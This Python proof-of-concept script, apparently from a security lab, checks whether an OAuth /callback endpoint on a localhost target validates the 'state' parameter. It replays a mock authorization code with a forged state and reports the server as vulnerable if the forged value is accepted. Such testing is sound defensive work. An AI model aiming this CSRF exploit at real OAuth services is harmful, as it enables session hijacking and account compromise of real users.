import requests, json, sys, argparse, uuid

TARGET = "http://127.0.0.1:5000"

def main():
    parser = argparse.ArgumentParser(description="OAuth CSRF / missing state validation PoC")
    parser.add_argument("--target", default=TARGET)
    parser.add_argument("--demo",   action="store_true")
    args = parser.parse_args()

    if args.demo:
        print("\n[*] ATTACK 3: OAuth CSRF — missing state parameter validation")
        print("[*] The /callback endpoint receives 'state' but never checks it")
        print("[*] against a server-side session value.")
        print("[*] Attacker can replay any authorization code to any session.\n")

    # Step 1 — legitimate authorize request (victim's flow)
    legit_state = str(uuid.uuid4())
    if args.demo:
        print(f"[*] Step 1 — Sending legitimate /authorize (state={legit_state[:8]}...)")

    r1 = requests.get(f"{args.target}/authorize", params={
        "redirect_uri": "http://127.0.0.1:5000/callback",
        "state": legit_state
    })
    auth_response = r1.json()
    if args.demo:
        print(f"[+] Got redirect: {auth_response.get('redirect_to')}\n")

    # Step 2 — attacker replays the code with a different state (forged session bind)
    attacker_state = "attacker-controlled-state"
    if args.demo:
        print(f"[*] Step 2 — Replaying code to /callback with forged state: {attacker_state}")

    r2 = requests.get(f"{args.target}/callback", params={
        "code": "mock-auth-code",
        "state": attacker_state
    })

    if args.demo:
        print(f"[+] Server responded {r2.status_code}\n")

    body = r2.json()
    print(json.dumps(body, indent=2))

    if body.get("received_state") == attacker_state:
        print("\n[!] VULNERABLE — server accepted callback with forged state (no CSRF protection)")
        sys.exit(0)
    else:
        print("\n[-] Attack failed (state validation present)")
        sys.exit(1)

if __name__ == "__main__":
    main()
